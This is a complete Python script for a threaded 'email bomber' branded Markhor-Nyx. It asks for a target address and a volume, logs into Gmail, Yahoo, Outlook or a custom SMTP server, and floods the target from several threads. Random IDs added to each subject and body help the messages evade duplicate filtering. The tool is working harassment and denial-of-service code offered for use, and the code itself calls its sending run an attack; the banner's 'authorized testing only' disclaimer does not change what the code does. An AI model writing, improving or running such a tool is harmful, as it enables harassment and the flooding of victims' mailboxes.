import smtplib
import sys
import time
import threading # For threading
import random    # For content randomization
import getpass   # For password input
from email.mime.text import MIMEText # For HTML emails
from email.mime.multipart import MIMEMultipart # For potentially combining HTML and Plain text

# Using your bcolors class for now
class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

# --- Global Variables for Threading ---
emails_sent_count = 0
count_lock = threading.Lock() # To safely increment emails_sent_count
stop_event = threading.Event() # To signal threads to stop

def banner():
    # (Banner code same as before - Markhor-Nyx branding)
    print(bcolors.GREEN + "******************************************************")
    print(bcolors.GREEN + "*      Markhor-Nyx Advanced Email Bomber (v2)      *")
    print(bcolors.GREEN + "*    Developed by: Markhor-Nyx                     *")
    print(bcolors.GREEN + "* Copyright (C) Markhor-Nyx. All rights reserved.   *")
    print(bcolors.GREEN + "******************************************************" + bcolors.RESET)
    print(bcolors.RED + "\n========================= WARNING! =========================")
    print(bcolors.YELLOW + "This tool is for EDUCATIONAL AND AUTHORIZED TESTING ONLY.")
    print(bcolors.YELLOW + "Unauthorized email bombing is ILLEGAL and considered SPAM/HARASSMENT.")
    print(bcolors.YELLOW + "You are solely responsible for your actions.")
    print(bcolors.RED + "==========================================================\n" + bcolors.RESET)


class Email_Bomber:
    # Removed self.count, using global emails_sent_count for threads

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing Advanced Email Bomber ]+]+]+' + bcolors.RESET)
            self.target = str(input(bcolors.GREEN + 'Enter target email address: ' + bcolors.RESET)).strip()
            if not self.target or "@" not in self.target or "." not in self.target:
                print(bcolors.RED + 'ERROR: Invalid target email format.' + bcolors.RESET); sys.exit(1)

            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1:(1000) 2:(500) 3:(250) 4:(custom)): ' + bcolors.RESET))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print(bcolors.RED + 'ERROR: Invalid Bomb mode.' + bcolors.RESET); sys.exit(1)
            
            # New: Number of threads
            self.num_threads = int(input(bcolors.GREEN + 'Enter number of threads (e.g., 5, 10): ' + bcolors.RESET))
            if self.num_threads <= 0:
                print(bcolors.RED + 'ERROR: Number of threads must be positive.' + bcolors.RESET); sys.exit(1)

            # New: Email type
            self.email_type = input(bcolors.GREEN + 'Send as HTML or Plain text? (html/plain) [default: plain]: ' + bcolors.RESET).lower().strip() or "plain"
            if self.email_type not in ["html", "plain"]:
                print(bcolors.RED + 'ERROR: Invalid email type.' + bcolors.RESET); sys.exit(1)
                
        except ValueError:
            print(bcolors.RED + 'ERROR: Invalid input.' + bcolors.RESET); sys.exit(1)
        except Exception as e:
            print(bcolors.RED + f'ERROR: {e}' + bcolors.RESET); sys.exit(1)

    def setup_bomb_amount(self):
        try:
            self.amount = 0
            if self.mode == 1: self.amount = 1000
            elif self.mode == 2: self.amount = 500
            elif self.mode == 3: self.amount = 250
            elif self.mode == 4:
                self.amount = int(input(bcolors.GREEN + 'Enter custom amount: ' + bcolors.RESET))
            
            if self.amount <= 0:
                print(bcolors.RED + 'ERROR: Amount must be positive.' + bcolors.RESET); sys.exit(1)
            print(bcolors.YELLOW + f'\nMode: {self.mode} | Emails: {self.amount} | Threads: {self.num_threads} | Type: {self.email_type.upper()}' + bcolors.RESET)
        except ValueError:
            print(bcolors.RED + 'ERROR: Invalid amount.' + bcolors.RESET); sys.exit(1)
        except Exception as e:
            print(bcolors.RED + f'ERROR: {e}' + bcolors.RESET); sys.exit(1)

    def setup_email_config(self): # Renamed to avoid conflict
        try:
            print(bcolors.YELLOW + '\n+[+[+[ Configuring Email Sender Details ]+]+]+' + bcolors.RESET)
            self.server_choice = str(input(bcolors.GREEN + 'Server - 1:Gmail 2:Yahoo 3:Outlook 4:Other: ' + bcolors.RESET)).strip()
            
            self.port = 587
            if self.server_choice == '1': self.server = 'smtp.gmail.com'
            elif self.server_choice == '2': self.server = 'smtp.mail.yahoo.com'
            elif self.server_choice == '3': self.server = 'smtp-mail.outlook.com'
            elif self.server_choice == '4':
                self.server = str(input(bcolors.GREEN + 'Custom SMTP server: ' + bcolors.RESET)).strip()
                custom_port = input(bcolors.GREEN + f'Port (default {self.port}): ' + bcolors.RESET).strip()
                if custom_port: self.port = int(custom_port)
            else:
                print(bcolors.RED + 'ERROR: Invalid server choice.' + bcolors.RESET); sys.exit(1)

            self.fromAddr = str(input(bcolors.GREEN + 'Sender email: ' + bcolors.RESET)).strip()
            self.fromPwd = getpass.getpass(bcolors.GREEN + 'Sender pass (or App Pass): ' + bcolors.RESET)
            self.subject_base = str(input(bcolors.GREEN + 'Subject: ' + bcolors.RESET))
            self.message_body_base = str(input(bcolors.GREEN + f'Message body ({self.email_type}): ' + bcolors.RESET))
            
            # New: Custom Header
            custom_header_input = input(bcolors.GREEN + 'Add a custom header? (e.g., X-Priority: 1 or leave blank): ' + bcolors.RESET).strip()
            self.custom_header = None
            if custom_header_input and ':' in custom_header_input:
                self.custom_header = custom_header_input.split(':', 1)
                self.custom_header = (self.custom_header[0].strip(), self.custom_header[1].strip())

        except Exception as e:
            print(bcolors.RED + f'ERROR during email config: {e}' + bcolors.RESET); sys.exit(1)

    def create_email_message(self, randomization_factor):
        subject = f"{self.subject_base} [ID:{randomization_factor}]" # Randomize subject
        
        if self.email_type == "html":
            # For HTML, ensure the message_body_base is valid HTML
            html_body = f"""\
            <html>
              <head></head>
              <body>
                <p>{self.message_body_base}</p>
                <p><small>Ref: {randomization_factor}</small></p>
              </body>
            </html>
            """
            msg = MIMEMultipart('alternative')
            msg.attach(MIMEText(html_body, 'html'))
        else: # Plain text
            plain_body = f"{self.message_body_base}\n\nRef: {randomization_factor}"
            msg = MIMEText(plain_body, 'plain')

        msg['From'] = self.fromAddr
        msg['To'] = self.target
        msg['Subject'] = subject
        
        if self.custom_header:
            msg[self.custom_header[0]] = self.custom_header[1]
            
        return msg.as_string()


    # This method will be run by each thread
    def email_sending_worker(self, emails_per_thread, thread_id):
        global emails_sent_count
        
        local_smtp_server = None # Each thread needs its own SMTP connection
        try:
            local_smtp_server = smtplib.SMTP(self.server, self.port)
            local_smtp_server.set_debuglevel(0)
            local_smtp_server.ehlo()
            local_smtp_server.starttls()
            local_smtp_server.ehlo()
            local_smtp_server.login(self.fromAddr, self.fromPwd)

            for i in range(emails_per_thread):
                if stop_event.is_set(): # Check if main program wants to stop
                    break 
                
                random_id = random.randint(10000, 999999) # For randomization
                message_to_send = self.create_email_message(random_id)
                
                try:
                    local_smtp_server.sendmail(self.fromAddr, self.target, message_to_send)
                    with count_lock:
                        emails_sent_count += 1
                    # Update progress on one line (can get messy with many threads printing)
                    # Consider a dedicated thread for printing progress smoothly.
                    # For now, let main thread handle periodic progress.
                except Exception as e:
                    # print(bcolors.RED + f'\nThread-{thread_id} ERROR sending: {e}' + bcolors.RESET)
                    # Decide if this error should stop this thread or continue
                    time.sleep(0.5) # Small delay on error before retrying or next email
                    pass # Continue trying for other emails in this thread's quota

        except smtplib.SMTPAuthenticationError:
            print(bcolors.RED + f"Thread-{thread_id} ERROR: SMTP Auth Failed." + bcolors.RESET)
        except Exception as e:
            print(bcolors.RED + f"Thread-{thread_id} Connection/Setup ERROR: {e}" + bcolors.RESET)
        finally:
            if local_smtp_server:
                try:
                    local_smtp_server.quit()
                except:
                    pass

    def launch_attack_threaded(self):
        global emails_sent_count
        emails_sent_count = 0 # Reset global counter
        stop_event.clear()    # Reset stop event

        print(bcolors.RED + '\n+[+[+[ Launching Threaded Attack! ]+]+]+' + bcolors.RESET)
        
        threads = []
        total_emails_to_send = self.amount
        emails_per_thread_base = total_emails_to_send // self.num_threads
        extra_emails = total_emails_to_send % self.num_threads

        attack_start_time = time.time()

        for i in range(self.num_threads):
            num_emails_for_this_thread = emails_per_thread_base
            if i < extra_emails: # Distribute remainder emails
                num_emails_for_this_thread += 1
            
            if num_emails_for_this_thread == 0: continue # Skip creating thread if no emails assigned

            thread = threading.Thread(target=self.email_sending_worker, args=(num_emails_for_this_thread, i + 1))
            threads.append(thread)
            thread.start()
            # print(f"Thread {i+1} started for {num_emails_for_this_thread} emails.")


        # Progress monitoring in main thread
        try:
            while any(t.is_alive() for t in threads):
                with count_lock:
                    # Progress bar
                    completed_ratio = emails_sent_count / total_emails_to_send if total_emails_to_send > 0 else 0
                    bar_length = 40
                    filled_length = int(bar_length * completed_ratio)
                    bar = '█' * filled_length + '-' * (bar_length - filled_length)
                    
                    sys.stdout.write(bcolors.YELLOW + f'\rProgress: [{bar}] {emails_sent_count}/{total_emails_to_send} ({completed_ratio*100:.2f}%)' + bcolors.RESET)
                    sys.stdout.flush()
                
                if stop_event.is_set(): # If Ctrl+C was pressed
                    break
                time.sleep(0.5) # Update progress display interval
        except KeyboardInterrupt:
            print(bcolors.YELLOW + "\n[!] Attack interrupted by user (Ctrl+C). Signaling threads to stop..." + bcolors.RESET)
            stop_event.set()
        
        # Final newline for progress bar
        print()

        print(bcolors.YELLOW + "Waiting for threads to complete..." + bcolors.RESET)
        for thread in threads:
            thread.join(timeout=10) # Wait for threads to finish, with a timeout

        total_time_taken = time.time() - attack_start_time
        
        if emails_sent_count == total_emails_to_send and not stop_event.is_set():
            print(bcolors.GREEN + f'\nAttack finished successfully! Sent {emails_sent_count} emails in {total_time_taken:.2f}s.' + bcolors.RESET)
        elif emails_sent_count > 0:
             print(bcolors.YELLOW + f'\nAttack ended. Sent {emails_sent_count} out of {total_emails_to_send} emails in {total_time_taken:.2f}s.' + bcolors.RESET)
        else:
             print(bcolors.RED + '\nAttack failed or was interrupted before sending emails.' + bcolors.RESET)
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomber = Email_Bomber()
    bomber.setup_bomb_amount()
    bomber.setup_email_config()
    
    confirm = input(bcolors.RED + f"Ready to send {bomber.amount} emails to {bomber.target} using {bomber.num_threads} threads. Proceed? (yes/no): " + bcolors.RESET).lower()
    if confirm == 'yes':
        bomber.launch_attack_threaded()
    else:
        print(bcolors.YELLOW + "Attack cancelled by user." + bcolors.RESET)
        sys.exit(0)